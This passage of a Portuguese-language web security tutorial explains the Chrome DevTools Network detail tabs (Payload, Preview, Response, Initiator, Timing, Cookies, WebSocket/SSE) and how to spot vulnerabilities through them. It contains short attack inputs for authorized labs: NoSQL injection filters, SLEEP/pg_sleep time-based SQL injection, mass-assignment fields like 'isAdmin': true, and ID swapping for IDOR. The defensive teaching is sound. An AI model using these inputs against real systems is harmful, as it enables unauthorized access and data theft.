- **Onde encontrar no DevTools**: painel **Network** → clique na requisição `POST` (ou `PUT`/`PATCH`) com `Content-Type: application/x-www-form-urlencoded` ou `multipart/form-data` → aba **Payload** → seção **Form Data**.
- **Exemplo prático**: ao submeter um formulário de login tradicional em `https://loja-ficticia.test/login`, a seção exibe:

```text
Form Data (3)   [view source] [view URL-encoded]
  email:       aluno@exemplo.test
  senha:       S3nhaF0rte!2026
  csrf_token:  8f3a1c9e7b2d4f6a0e1c3b5d7f9a2e4c
```

- **Comportamento normal**: exibir os nomes (`name="..."` dos elementos `<input>`, `<select>`, `<textarea>`) e respectivos valores enviados pelo usuário, além de campos ocultos (`<input type="hidden">`) como tokens anti-CSRF.
  - **Nota importante de segurança**: ver a própria senha em texto legível dentro de **Form Data** no seu próprio DevTools durante o login **não significa, por si só, que a conexão está sem criptografia**. O DevTools inspeciona os dados dentro do navegador (antes da criptografia TLS na saída e depois da descriptografia TLS na chegada). Para saber se houve criptografia em trânsito, verifique se a `Request URL` usa **`https://`** e se o protocolo/TLS está válido na aba **Security**.
- **O que seria considerado seguro**:
  - Submissão feita via método `POST` sobre `https://` **[REQUISITO]**;
  - Presença de token anti-CSRF imprevisível quando a sessão é mantida por cookies **[REQUISITO]**;
  - Em uploads (`multipart/form-data`), envio apenas de tipos de arquivo esperados, validados posteriormente no servidor **[REQUISITO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - Formulário submetido para uma URL `http://` (os dados do *Form Data* trafegam em texto claro pela rede);
  - Ausência de token anti-CSRF em formulários autenticados (se o cookie não for `SameSite=Strict`/`Lax` ou se precisar de defesa em profundidade contra CSRF);
  - Campos ocultos (`<input type="hidden" name="preco" value="150.00">` ou `name="id_usuario" value="42"`) que determinam preço, desconto ou identidade sem validação no servidor;
  - Em `multipart/form-data`, possibilidade de enviar arquivo `.php`, `.jsp`, `.html` ou `.svg` com scripts sem validação de conteúdo real (*magic bytes*) no back-end.
- **Como investigar o problema**:
  1. Ative **Preserve log** antes de enviar um formulário (pois formulários tradicionais costumam responder com um redirecionamento `302 Found` que limpa a tabela se *Preserve log* estiver desmarcado);
  2. Clique na requisição `POST` e abra **Payload** → **Form Data**;
  3. Verifique se há campos ocultos manipuláveis e confira na seção **General** se o `Request URL` é `https://`.
- **Como corrigir ou prevenir**: servir tanto a página que contém o `<form>` quanto o endpoint `action="..."` exclusivamente via HTTPS **[REQUISITO]**; implementar proteção anti-CSRF por token sincronizador ou *Double Submit Cookie* aliada a cookies `SameSite` **[REQUISITO]**; jamais confiar em valores vindos de `<input type="hidden">` para regras de negócio críticas **[REQUISITO]**.

##### Request Payload

- **Nome do parâmetro**: `Request Payload` (Carga Útil Bruta / Estruturada da Requisição).
- **O que significa**: seção da aba **Payload** exibida quando o corpo da requisição utiliza formatos não baseados em formulário tradicional — tipicamente `application/json`, `application/xml`, `text/plain`, `application/graphql` ou payloads binários/customizados enviados via `fetch()` ou `XMLHttpRequest`.
- **Para que serve**: inspecionar a estrutura exata do objeto enviado à API (com árvore colapsável automática quando o conteúdo é JSON válido) ou o texto bruto enviado no corpo da requisição.
- **Onde encontrar no DevTools**: painel **Network** → clique na requisição (ex.: `POST`, `PUT`, `PATCH`) → aba **Payload** → seção **Request Payload**. Oferece o botão **view source** para ver a string JSON serializada original e, quando visualizado como árvore, permite clicar com o botão direito em qualquer propriedade para usar **Copy value** ou **Copy property path**.
- **Exemplo prático**:

```json
{
  "destinatarioConta": "0001-98765-4",
  "valorCentavos": 25000,
  "descricao": "Pagamento aluguel",
  "idempotencyKey": "550e8400-e29b-41d4-a716-446655440000"
}
```

- **Comportamento normal**: chamadas de SPAs (*Single-Page Applications*) e aplicações modernas enviam objetos JSON enxutos contendo apenas os identificadores e atributos que o usuário tem permissão para informar, acompanhados do header `Content-Type: application/json`.
- **O que seria considerado seguro**:
  - Payloads JSON enviados exclusivamente via HTTPS **[REQUISITO]**;
  - Identidade do usuário obtida no servidor a partir da sessão/token autenticado, e **não** de um campo `"usuarioOrigemId": 123` dentro do JSON **[REQUISITO]**;
  - Uso de chave de idempotência (`idempotencyKey`) em operações financeiras ou críticas para evitar duplicidade em retentativas **[BOA PRÁTICA]**.
- **O que poderia indicar uma vulnerabilidade**:
  - Presença de `"userId": 123` ou `"contaOrigem": "..."` que, se alterado pelo cliente para outro ID, permite executar ações em nome de terceiros (**BOLA / IDOR**);
  - Envio de propriedades administrativas (`"role": "admin"`, `"aprovado": true`, `"saldo": 99999`) aceitas pelo ORM (*Object-Relational Mapping*) do servidor (**Mass Assignment**);
  - Envio de consultas completas ou filtros arbitrários em objetos JSON (ex.: `{"filtro": {"$gt": ""}}` em bancos NoSQL, levando a **NoSQL Injection**);
  - Em GraphQL, queries enviando mutações não autorizadas ou introspecção irrestrita em produção.
- **Como investigar o problema**:
  1. Filtre por `Fetch/XHR` na aba Network e inspecione a seção **Request Payload** das requisições `POST`, `PUT` e `PATCH`;
  2. Observe se o JSON enviado contém IDs de proprietário, preços, permissões ou estruturas de consulta de banco de dados;
  3. Em laboratório autorizado, clique com o botão direito na requisição → **Copy** → **Copy as fetch**, edite o corpo JSON no Console (por exemplo, adicionando `"isAdmin": true` ou trocando o ID de recurso) e verifique se o servidor rejeita com `400 Bad Request` / `403 Forbidden` ou se aceita indevidamente.
- **Como corrigir ou prevenir**: usar DTOs (*Data Transfer Objects*) ou validadores de schema estritos (como Zod, Joi, Pydantic, Bean Validation) que rejeitem ou ignorem campos não listados explicitamente **[REQUISITO]**; extrair o ID do usuário autenticado sempre do contexto de sessão no servidor **[REQUISITO]**.


##### Preview

- **Nome do parâmetro**: Aba `Preview` (Pré-visualização da Resposta).
- **O que significa**: aba do painel de detalhes da requisição que apresenta uma **representação visual, formatada ou interativa** do corpo da resposta HTTP, adaptada conforme o cabeçalho `Content-Type` retornado pelo servidor.
- **Para que serve**: facilitar a leitura humana da resposta sem precisar lidar com texto minificado ou bytes binários:
  - Para **JSON** (`application/json`), monta uma **árvore de objetos expansível e colapsável**, facilitando navegar em arrays grandes e objetos aninhados;
  - Para **Imagens** (`image/png`, `image/jpeg`, `image/webp`, `image/svg+xml`), renderiza a própria imagem com suas dimensões e tamanho;
  - Para **HTML** (`text/html`), renderiza uma prévia visual básica do documento (útil para ler a mensagem de uma página de erro `500` ou `404`);
  - Para **Fontes**, exibe uma amostra dos glifos tipográficos.
- **Onde encontrar no DevTools**: painel **Network** → clique na requisição → aba **Preview** (entre *Payload* e *Response*).
- **Exemplo prático**: ao inspecionar `GET https://api.loja-ficticia.test/v1/usuarios/me`, a aba **Preview** exibe o objeto JSON formatado como árvore interativa:

```text
▼ {id: 42, nome: "Marina Souza", email: "marina@exemplo.test", perfil: "cliente", ...}
    email: "marina@exemplo.test"
    id: 42
    nome: "Marina Souza"
    perfil: "cliente"
  ▶ enderecos: [{cep: "01001-000", cidade: "São Paulo", ...}]
```

- **Comportamento normal**: respostas JSON mostram apenas os campos necessários para a tela atual; imagens e ícones são exibidos corretamente; páginas de erro mostram um layout amigável sem detalhes técnicos internos.
- **O que seria considerado seguro**: objetos JSON contendo estritamente os atributos públicos ou autorizados para o usuário logado (princípio da minimização de dados) **[REQUISITO]**; páginas de erro HTML genéricas contendo apenas um código de protocolo/correlação para suporte **[RECOMENDAÇÃO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - **Excessive Data Exposure** (Exposição Excessiva de Dados — categoria crítica da OWASP API Security): o front-end exibe na tela apenas o `nome` do vendedor, mas ao expandir a árvore JSON na aba **Preview**, você descobre que a API retornou também `cpf`, `telefoneCelular`, `enderecoResidencial`, `hashSenha` (`$2b$12$...`), `tokenResetSenha` ou `notasInternasFraude`;
  - Páginas de erro `500 Internal Server Error` que, na aba **Preview**, renderizam a página de *debug* do framework (como Django Debug Page, Laravel Ignition/Whoops, ASP.NET Yellow Screen of Death) contendo variáveis de ambiente, chaves secretas de banco de dados e trechos do código-fonte.
- **Como investigar o problema**:
  1. Filtre por `Fetch/XHR` na aba Network e clique em cada requisição da aplicação com a aba **Preview** aberta;
  2. Expanda todos os nós dos objetos JSON (dica: segure `Alt` / `Option` ao clicar na seta `▶` para expandir recursivamente todos os subnós) e procure campos que não aparecem na interface gráfica da página;
  3. Clique com o botão direito em qualquer propriedade suspeita → **Copy property path** para documentar o achado na auditoria.
- **Como corrigir ou prevenir**: nunca serializar diretamente entidades completas do banco de dados/ORM na resposta HTTP; utilizar DTOs de saída, *serializers* explícitos ou projeções (`SELECT` apenas das colunas necessárias) **[REQUISITO]**; desabilitar páginas de debug detalhadas em produção (`DEBUG=False`, `NODE_ENV=production`) **[REQUISITO]**.

##### Response

- **Nome do parâmetro**: Aba `Response` (Corpo Bruto da Resposta).
- **O que significa**: aba do painel de detalhes da requisição que exibe o **conteúdo textual bruto (código-fonte)** do corpo da resposta HTTP enviado pelo servidor (após a descompressão automática de `gzip`, `br` — Brotli — ou `zstd` pelo navegador).
- **Para que serve**: inspecionar o código exato recebido pelo navegador — linhas de HTML, arquivos JavaScript (`.js`), folhas de estilo (`.css`), payloads JSON brutos, XML, CSV ou mensagens de texto — e permitir a formatação legível (*pretty-print*) de código minificado por meio do botão **`{}`** (*Pretty print*) na parte inferior da aba.
- **Onde encontrar no DevTools**: painel **Network** → clique na requisição → aba **Response**. Possui barra de busca interna (`Ctrl+F` quando o foco está dentro do editor da aba Response) e o botão **`{}`** para indentar código minificado.
- **Exemplo prático**: ao inspecionar uma resposta `500` de uma API mal configurada na aba **Response**:

```json
{
  "erro": "Falha ao executar consulta",
  "detalhe": "org.postgresql.util.PSQLException: ERROR: syntax error at or near \"'\" at character 64\n  Query: SELECT id, nome FROM usuarios WHERE nome = 'admin'' AND ativo = true",
  "stack": "at br.com.exemplo.UsuarioRepository.buscar(UsuarioRepository.java:87)\n..."
}
```

- **Comportamento normal**: retornar o HTML da página, o bundle JS/CSS esperado ou o JSON da API sem comentários internos sensíveis, sem chaves privadas e sem rastros de pilha (*stack traces*).
- **O que seria considerado seguro**:
  - Respostas de erro padronizadas (ex.: RFC 9457 — *Problem Details for HTTP APIs*) sem detalhes de banco de dados, caminhos de diretórios do servidor (`/var/www/app/...`) ou versões de bibliotecas **[REQUISITO]**;
  - Bundles JavaScript de produção sem chaves secretas de back-end e sem arquivos de mapeamento (`.js.map`) expostos publicamente quando o código-fonte for proprietário **[RECOMENDAÇÃO]**;
  - Valores originados do usuário devidamente escapados com entidades HTML (`&lt;`, `&gt;`, `&quot;`, `&#x27;`, `&amp;`) quando inseridos em respostas `text/html` **[REQUISITO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - Mensagens de erro de banco de dados (`SQLSTATE`, `ORA-`, `You have an error in your SQL syntax`, `PSQLException`) revelando vulnerabilidade a **SQL Injection**;
  - *Stack traces* completos revelando nomes de classes, pacotes, versões de frameworks e estrutura de diretórios do servidor;
  - Comentários esquecidos no HTML/JS (`<!-- TODO: remover rota /admin/debug antes do deploy -->`, `// Chave da API de homologação: sk_live_...`);
  - Credenciais hardcoded em arquivos `.js` (ex.: `AWS_SECRET_ACCESS_KEY`, `FIREBASE_SERVICE_ACCOUNT`, `STRIPE_SECRET_KEY` — atenção: chaves públicas identificadoras como Firebase Web API Key ou Stripe Publishable Key `pk_...` são feitas para o cliente, mas chaves secretas `sk_...` ou tokens de administração jamais podem estar no bundle);
  - Parâmetros enviados na requisição sendo refletidos literalmente no HTML da aba **Response** sem codificação de saída (evidência direta de **XSS Refletido**).
- **Como investigar o problema**:
  1. Use o painel de busca global do Network (`Ctrl+F` na barra lateral de busca da aba Network) para procurar em **todas** as respostas carregadas termos como `password`, `secret`, `token`, `apiKey`, `private_key`, `Exception`, `StackTrace`, `SELECT `, `TODO`, `FIXME`, `admin`;
  2. Ao encontrar uma correspondência em um arquivo `.js` minificado, clique nele, vá à aba **Response** e clique no ícone **`{}`** (*Pretty print*) para ler o contexto ao redor da linha encontrada.
- **Como corrigir ou prevenir**: manter segredos exclusivamente em variáveis de ambiente ou cofres de segredos (*secret managers*) no servidor **[REQUISITO]**; usar scanners de segredos no repositório Git (como Gitleaks ou TruffleHog) antes do build **[BOA PRÁTICA]**; implementar um manipulador global de exceções (*global exception handler*) que registre o *stack trace* apenas no log interno do servidor e retorne mensagem genérica ao cliente **[REQUISITO]**.

##### Initiator

- **Nome do parâmetro**: Aba `Initiator` (Iniciador da Requisição).
- **O que significa**: aba do painel de detalhes da requisição que mostra **por que** e **por quem** aquela requisição foi disparada, exibindo duas estruturas fundamentais:
  1. **Request call stack** (Pilha de chamadas da requisição): quando a requisição foi iniciada por JavaScript (`fetch`, `XMLHttpRequest`, criação dinâmica de `<script>` ou `<img>`), exibe a sequência exata de funções JavaScript (do topo, onde o envio ocorreu, até a função inicial que deu origem ao fluxo), com links clicáveis para o arquivo e linha/coluna no painel **Sources**;
  2. **Request initiator chain** (Cadeia de iniciadores da requisição): árvore hierárquica que mostra qual recurso carregou qual — por exemplo, o documento `index.html` iniciou `app.js`, que por sua vez iniciou `analytics.js`, que finalmente iniciou a requisição para `https://coletor-externo.test/track`.
- **Para que serve**: rastrear a origem exata de requisições misteriosas, entender dependências de carregamento para otimização de performance e, em segurança, descobrir qual script (próprio, biblioteca de terceiro ou payload de XSS/extensão) está fazendo chamadas de rede ou exfiltrando dados.
- **Onde encontrar no DevTools**: painel **Network** → clique na requisição → aba **Initiator** (também acessível de forma resumida na coluna **Initiator** da tabela de requisições; segurar `Shift` e passar o mouse sobre uma linha na tabela destaca em **verde** os iniciadores e em **vermelho** as requisições iniciadas por ela).
- **Exemplo prático**:

```text
Request call stack
  enviarTelemetria          @ checkout.js:142
  finalizarCompra           @ checkout.js:89
  (anonymous)               @ botao-pagar.js:24

Request initiator chain
  https://loja-ficticia.test/checkout
  └── https://loja-ficticia.test/static/js/checkout.js
      └── https://api-desconhecida.exemplo.test/collect
```

- **Comportamento normal**: requisições de API de negócio têm como iniciador os scripts oficiais da aplicação (`app.bundle.js`, `main.js`); fontes e imagens têm como iniciador o documento HTML (`Parser`) ou folhas de estilo CSS.
- **O que seria considerado seguro**: todas as requisições que manipulam ou recebem dados sensíveis são iniciadas exclusivamente por scripts de primeira parte auditados ou bibliotecas verificadas com **SRI** (*Subresource Integrity* — integridade de sub-recursos) **[RECOMENDAÇÃO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - Uma requisição enviando dados do formulário de cartão de crédito ou `localStorage` para um domínio externo desconhecido, cujo **Request call stack** aponta para um script de terceiro comprometido (ataque de **Magecart / Supply Chain / Formjacking**);
  - Uma requisição iniciada a partir de `VM123:1` ou `(index):45` decorrente de `eval()`, `setTimeout("...")` ou script inline injetado por **XSS**;
  - Cadeia de iniciadores longa em que um script de anúncio carrega um segundo script de outra rede, que carrega um terceiro script não autorizado na página.
- **Como investigar o problema**:
  1. Ao notar uma requisição suspeita para um domínio externo na tabela do Network, clique nela e abra a aba **Initiator**;
  2. Analise a **Request initiator chain** para ver qual arquivo introduziu aquele domínio na página;
  3. Clique no primeiro link da **Request call stack** para abrir diretamente a linha exata no painel **Sources**, coloque um *breakpoint* nessa linha e recarregue a página para inspecionar as variáveis locais no momento exato antes do envio.
- **Como corrigir ou prevenir**: restringir quais domínios podem carregar scripts (`script-src`) e para quais domínios o navegador pode enviar requisições (`connect-src`) usando **Content-Security-Policy (CSP)** **[RECOMENDAÇÃO]**; utilizar o atributo `integrity="sha384-..."` (SRI) em scripts carregados de CDNs externas **[RECOMENDAÇÃO]**; auditar dependências npm/front-end regularmente **[BOA PRÁTICA]**.

##### Timing

- **Nome do parâmetro**: Aba `Timing` (Tempos e Fases da Requisição).
- **O que significa**: aba do painel de detalhes da requisição que decompõe o tempo total da transação em um gráfico de barras horizontais detalhado, mostrando quanto tempo (em milissegundos ou microssegundos) foi gasto em cada etapa do ciclo de vida da requisição: **Resource Scheduling** (*Queueing*), **Connection Start** (*Stalled*, *DNS Lookup*, *Initial connection*, *SSL*), **Request/Response** (*Request sent*, *Waiting for server response — TTFB*, *Content Download*) e, quando aplicável, etapas de **Service Worker** e a API **Server-Timing** (se o servidor enviar o header de resposta `Server-Timing`).
- **Para que serve**: diagnosticar gargalos de desempenho (descobrir se a lentidão está no navegador enfileirando conexões, no DNS, no handshake TLS, no processamento de back-end/banco de dados ou na largura de banda do download) e auxiliar análises de segurança (como identificar se uma conexão foi reutilizada ou detectar variações de tempo no servidor).
- **Onde encontrar no DevTools**: painel **Network** → clique na requisição → aba **Timing** (também visível como um *popover* resumido ao passar o mouse sobre a barra colorida da coluna **Waterfall** na tabela de requisições).
- **Exemplo prático**:

```text
Queued at 145 ms
Started at 148 ms

Resource Scheduling                  DURATION
  Queueing                           3.12 ms
Connection Start                     DURATION
  Stalled                            0.85 ms
  DNS Lookup                         18.40 ms
  Initial connection                 42.10 ms
  SSL                                21.05 ms
Request/Response                     DURATION
  Request sent                       0.32 ms
  Waiting for server response        112.50 ms
  Content Download                   4.20 ms
Explanation                          202.54 ms

Server Timing
  db;desc="Consulta PostgreSQL"      84.10 ms
  render;desc="Serialização JSON"    12.30 ms
```

- **Comportamento normal**: na primeira requisição para um domínio, aparecem `DNS Lookup`, `Initial connection` e `SSL`; nas requisições subsequentes para o mesmo domínio sobre HTTP/2 ou HTTP/3 (ou conexões Keep-Alive reaproveitadas), essas três barras não aparecem (pois a conexão já está aberta), restando apenas `Stalled`, `Request sent`, `Waiting for server response` e `Content Download`.
- **O que seria considerado seguro**:
  - Presença da fase `SSL` no estabelecimento inicial da conexão (confirmando uso de TLS/HTTPS) **[REQUISITO]**;
  - Tempos de resposta (`Waiting for server response`) constantes em rotas críticas de autenticação (mitigando *timing attacks* de enumeração de usuários) **[RECOMENDAÇÃO]**;
  - Ausência de cabeçalhos `Server-Timing` detalhados expostos para usuários anônimos em produção se eles revelarem arquitetura interna sensível **[BOA PRÁTICA]**.
- **O que poderia indicar uma vulnerabilidade**:
  - **Diferença sistemática de TTFB em login/recuperação de senha** (ataque de enumeração por tempo): por exemplo, quando o e-mail informado **não existe** no banco, o servidor responde em `8 ms` (porque nem executa o algoritmo de hash de senha); quando o e-mail **existe**, o servidor gasta `280 ms` calculando o hash Argon2id/bcrypt antes de responder "Usuário ou senha inválidos". Mesmo com a mesma mensagem de texto e mesmo status `401`, a aba **Timing** revela se o usuário existe;
  - **Blind SQL Injection Baseado em Tempo (*Time-Based Blind SQLi*)**: em testes autorizados de laboratório, um payload contendo `SLEEP(5)` ou `pg_sleep(5)` faz a fase `Waiting for server response` saltar exatamente para `5000+ ms`;
  - Cabeçalho `Server-Timing` esquecido aberto em produção revelando nomes de microsserviços internos, versões ou consultas de banco.
- **Como investigar o problema**: compare a barra `Waiting for server response` na aba **Timing** entre diferentes entradas de teste (em laboratório autorizado); verifique no final da aba **Timing** se há entradas na seção **Server Timing** (alimentadas pelo header HTTP `Server-Timing`). Veja a subseção [2.1.6 Performance e rede: fases de Timing](#s2-1-6) para a análise individual completa de cada fase.
- **Como corrigir ou prevenir**: em fluxos de login, executar um cálculo de hash fictício (*dummy hash*) quando o usuário não for encontrado no banco de dados para igualar o TTFB **[RECOMENDAÇÃO]**; usar comparações em tempo constante (`crypto.timingSafeEqual`) ao validar segredos e HMACs **[REQUISITO]**; restringir o envio do header `Server-Timing` apenas a requisições autenticadas de administradores/monitoramento interno **[BOA PRÁTICA]**.

##### Cookies

- **Nome do parâmetro**: Aba `Cookies` (Cookies da Requisição e da Resposta).
- **O que significa**: aba do painel de detalhes da requisição que parseia e organiza em tabelas estruturadas todos os cookies envolvidos naquela transação específica:
  1. **Request Cookies**: cookies que o navegador enviou para o servidor no cabeçalho `Cookie`;
  2. **Response Cookies**: cookies que o servidor ordenou criar, atualizar ou apagar por meio de cabeçalhos `Set-Cookie` naquela resposta.
- **Para que serve**: inspecionar individualmente cada cookie enviado ou recebido e todos os seus atributos de segurança (`Name`, `Value`, `Domain`, `Path`, `Expires / Max-Age`, `Size`, `HttpOnly`, `Secure`, `SameSite`, `Partition Key`) sem precisar ler manualmente strings longas separadas por ponto e vírgula na aba *Headers*, além de revelar **cookies filtrados ou bloqueados** pelo navegador.
- **Onde encontrar no DevTools**: painel **Network** → clique em uma requisição que envie ou receba cookies → aba **Cookies**.
  - **Caixa de seleção *"show filtered out request cookies"* (mostrar cookies de requisição filtrados)**: recurso fundamental dessa aba! Ao marcá-lo, o DevTools exibe (destacados em amarelo) os cookies que **existiam** para aquele domínio no navegador, mas que **foram retidos/bloqueados pelo navegador e NÃO foram enviados** naquela requisição, explicando em um *tooltip* o motivo exato (por exemplo: o cookie era `SameSite=Strict` e a requisição veio de navegação cross-site; o cookie tinha `Secure` e a requisição foi feita via `http://`; ou o cookie de terceiro foi bloqueado pelas políticas de privacidade do navegador).
  - Da mesma forma, em **Response Cookies**, cookies `Set-Cookie` rejeitados pelo navegador (ex.: `SameSite=None` sem `Secure`, ou prefixo `__Host-` sem `Path=/`) aparecem destacados com ícone de alerta explicando por que não foram salvos.
- **Exemplo prático**:
  - Na tabela **Response Cookies** após um `POST /login`:

| Name | Value | Domain | Path | Expires / Max-Age | Size | HttpOnly | Secure | SameSite | Partition Key |
|---|---|---|---|---|---|---|---|---|---|
| `__Host-sid` | `8f9a2b...` | `loja-ficticia.test` | `/` | `Session` | `46` | ✓ | ✓ | `Strict` | — |
| `preferencia_tema` | `escuro` | `.loja-ficticia.test` | `/` | `2027-10-30T...` | `22` | (vazio) | ✓ | `Lax` | — |

- **Comportamento normal**: cookies de sessão e autenticação exibem marcação (`✓`) nas colunas **HttpOnly** e **Secure**, possuem **SameSite** definido como `Strict` ou `Lax` e escopo restrito; nenhum cookie legítimo da aplicação aparece com ícone de bloqueio amarelo.
- **O que seria considerado seguro**:
  - Cookies de sessão/autenticação com `HttpOnly` (`✓`), `Secure` (`✓`) e `SameSite=Strict` ou `SameSite=Lax` **[REQUISITO]**;
  - Uso dos prefixos de cookie `__Host-` (exige `Secure`, `Path=/` e proíbe atributo `Domain`, impedindo que subdomínios sobrescrevam o cookie) ou `__Secure-` (exige `Secure`) **[RECOMENDAÇÃO]**;
  - Valor do cookie de sessão opaco, gerado por CSPRNG (*Cryptographically Secure Pseudo-Random Number Generator*) com alta entropia (pelo menos 128 bits) **[REQUISITO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - Coluna **HttpOnly** vazia em cookie de sessão (`session_id`, `connect.sid`, `PHPSESSID`, `JSESSIONID`, `jwt`), permitindo roubo direto via `document.cookie` em caso de XSS;
  - Coluna **Secure** vazia, permitindo que o cookie vaze se o usuário fizer qualquer requisição `http://` para o domínio;
  - Coluna **SameSite** com `None` em cookie de sessão sem necessidade real de uso em iframe cross-site (aumentando a superfície para ataques de CSRF e *XS-Leaks*);
  - Valor do cookie contendo objetos serializados inseguros ou dados em Base64 sem assinatura criptográfica (ex.: `eyJyb2xlIjoidXNlciJ9` que decodifica para `{"role":"user"}` e pode ser alterado manualmente pelo usuário).
- **Como investigar o problema**:
  1. Na tabela de requisições do painel Network, ative as colunas opcionais **Cookies** e **Set Cookies** (ou use os checkboxes de filtro **Blocked response cookies** na barra superior de filtros);
  2. Clique nas requisições que definem cookies e abra a aba **Cookies**;
  3. Marque **show filtered out request cookies** sempre que estiver depurando por que uma sessão não foi enviada ou verificando se a proteção `SameSite` realmente impediu o envio em um cenário cross-site.
- **Como corrigir ou prevenir**: configurar todos os cookies de sessão no servidor com `Secure; HttpOnly; SameSite=Lax` (ou `Strict`) e preferir o prefixo `__Host-` **[REQUISITO]**; assinar ou criptografar qualquer cookie cujo conteúdo seja lido pelo servidor (ou manter apenas o ID opaco no cookie e os dados no banco/Redis no servidor) **[REQUISITO]**. (Veja aprofundamento completo na seção [2.2.5 Cookies na aba Application](./02b-devtools-application.md#s2-2-5)).

##### EventStream e Messages (SSE e WebSockets)

- **Nome do parâmetro**: Abas `EventStream` (Fluxo de Eventos / *Server-Sent Events*) e `Messages` (Mensagens de WebSocket).
- **O que significa**: abas especializadas do painel de detalhes da requisição que aparecem para conexões persistentes e em tempo real:
  - **Aba `EventStream`**: exibida em respostas HTTP cujo cabeçalho é `Content-Type: text/event-stream` (padrão **SSE — Server-Sent Events**, consumido no JavaScript via `EventSource` ou `fetch` com *streams*, muito comum em notificações em tempo real e respostas em streaming de LLMs/chats). Lista cada evento recebido em uma tabela com colunas `Id`, `Type`, `Data` e `Time`;
  - **Aba `Messages`**: exibida em conexões **WebSocket** (iniciadas via handshake HTTP `101 Switching Protocols` com `Upgrade: websocket` sob esquema `ws://` ou `wss://`, RFC 6455). Lista todos os quadros (*frames*) enviados pelo cliente (seta verde para cima `↑`) e recebidos do servidor (seta laranja/branca para baixo `↓`), com colunas `Data`, `Length` e `Time`.
- **Para que serve**: monitorar em tempo real cada mensagem individual trocada dentro de uma única conexão de longa duração, filtrar mensagens por texto/regex e distinguir mensagens enviadas (*Send*) de recebidas (*Receive*).
- **Onde encontrar no DevTools**:
  - Para **WebSockets**: filtre por **WS** (ou **Socket**) na barra de filtros da aba Network → clique na requisição com status `101` → aba **Messages**;
  - Para **SSE**: clique na requisição com tipo `eventsource` (ou `fetch` com `text/event-stream`) → aba **EventStream**.
- **Exemplo prático**:
  - Na aba **Messages** de uma conexão `wss://chat.loja-ficticia.test/ws`:

| Data | Length | Time |
|---|---|---|
| `↑ {"acao":"entrar_sala","pedidoId":9042}` | 41 | 10:20:01.120 |
| `↓ {"evento":"historico","mensagens":[{"autor":"Suporte","texto":"Olá!"}]}` | 74 | 10:20:01.185 |
| `↑ {"acao":"mensagem","texto":"Meu pedido atrasou"}` | 50 | 10:20:05.410 |

- **Comportamento normal**: conexões WebSocket utilizam sempre o esquema criptografado **`wss://`** (WebSocket Secure sobre TLS); o handshake inicial valida autenticação e cabeçalho `Origin`; cada mensagem trafega apenas os dados necessários para o usuário autenticado.
- **O que seria considerado seguro**:
  - Uso exclusivo de `wss://` (para WebSockets) e `https://` (para SSE) **[REQUISITO]**;
  - Validação rigorosa do cabeçalho `Origin` no servidor durante o handshake do WebSocket (pois conexões WebSocket **não** são restringidas pela política padrão de leitura do CORS da mesma forma que `fetch`, o que permite **CSWSH — Cross-Site WebSocket Hijacking** caso a autenticação dependa apenas de cookies e o servidor não valide o `Origin`) **[REQUISITO]**;
  - Autorização verificada no servidor a cada mensagem ou inscrição de canal/sala (ex.: verificar se o usuário logado realmente é dono do `pedidoId: 9042` antes de inscrevê-lo no canal) **[REQUISITO]**.
- **O que poderia indicar uma vulnerabilidade**:
  - Conexão `ws://` sem TLS trafegando tokens ou mensagens privadas em texto claro;
  - Handshake `101 Switching Protocols` aceitando qualquer `Origin` enquanto usa cookies de sessão sem token adicional (**CSWSH**);
  - Na aba **Messages** ou **EventStream**, recebimento de um fluxo global com eventos de **outros usuários** (ex.: notificações de compras de terceiros com nome, CPF e endereço que o front-end apenas oculta visualmente, mas que chegam no canal WebSocket);
  - Mensagens recebidas via WebSocket ou SSE sendo injetadas diretamente no DOM com `innerHTML` sem sanitização (causando **DOM-based XSS via WebSocket/SSE**).
- **Como investigar o problema**:
  1. Filtre por **WS** na aba Network e clique na conexão ativa (se a conexão foi aberta antes de você abrir o DevTools, recarregue a página com o DevTools aberto para capturá-la desde o início);
  2. Verifique na aba **Headers** do WebSocket se a URL é `wss://` e qual `Origin` foi enviado;
  3. Abra a aba **Messages** (ou **EventStream**), use a caixa de filtro da própria aba para buscar dados sensíveis e observe o que acontece quando você interage com a aplicação.
- **Como corrigir ou prevenir**: validar estritamente o cabeçalho `Origin` no handshake de WebSocket contra uma lista de origens permitidas e exigir token de autenticação explícito **[REQUISITO]**; validar permissões de acesso a cada tópico/sala no servidor (prevenindo IDOR em canais de tempo real) **[REQUISITO]**; renderizar dados recebidos de WebSockets/SSE usando `textContent` ou sanitizador seguro **[REQUISITO]**.


<a id="s2-1-6"></a>
#### 2.1.6 Performance e rede: fases de Timing

Cada requisição capturada no painel **Network** atravessa uma sequência bem definida de fases desde o instante em que o navegador descobre que precisa do recurso até o momento em que o último byte da resposta é entregue ao processo de renderização. Essas fases compõem as barras coloridas da coluna **Waterfall** (Cascata) e são detalhadas com precisão de sub-milissegundos na aba **Timing** do painel de detalhes da requisição.

Compreender cada fase é indispensável tanto para **engenharia de performance** (identificar onde estão os gargalos de rede, cliente ou servidor) quanto para **segurança da informação** (detectar ausência de TLS, ataques de enumeração por tempo, *Blind SQL Injection* baseado em tempo, exaustão de conexões e interceptação por *Service Workers*).

```text
Ciclo de Vida Completo de uma Requisição HTTP/HTTPS no Chrome DevTools:

[Queueing] → [Stalled] → (Service Worker*) → [DNS Lookup] → [Initial Connection (TCP/QUIC)]
                                                                         │
[Content Download] ← [Waiting for server response (TTFB)] ← [Request Sent] ← [SSL (TLS)]

(* Fases de Service Worker só ocorrem quando há um Service Worker ativo controlando o escopo da página)
```

A tabela a seguir resume as fases e seu significado visual na coluna **Waterfall**:

| Fase no DevTools | Grupo na aba Timing | Onde ocorre o custo principal | Quando NÃO aparece |
|---|---|---|---|
| **Queueing** | *Resource Scheduling* | Navegador (fila interna de prioridade/conexões) | Raro (quase toda requisição passa por breve agendamento) |
| **Stalled** | *Connection Start* | Navegador (espera por socket, proxy ou cache) | Quando o socket está imediatamente livre |
| **ServiceWorker Preparation / Request to ServiceWorker** | *Connection Start* / *Request/Response* | Navegador (thread do Service Worker) | Quando o site não usa Service Worker |
| **DNS Lookup** | *Connection Start* | Rede / Resolvedor DNS | Conexão reutilizada ou DNS já em cache |
| **Initial connection** | *Connection Start* | Rede (Handshake TCP de 3 vias ou QUIC) | Conexão TCP/QUIC já aberta e reutilizada |
| **SSL** | *Connection Start* | Rede + CPU (Handshake TLS 1.2 / 1.3) | Requisições `http://` ou conexão TLS reutilizada |
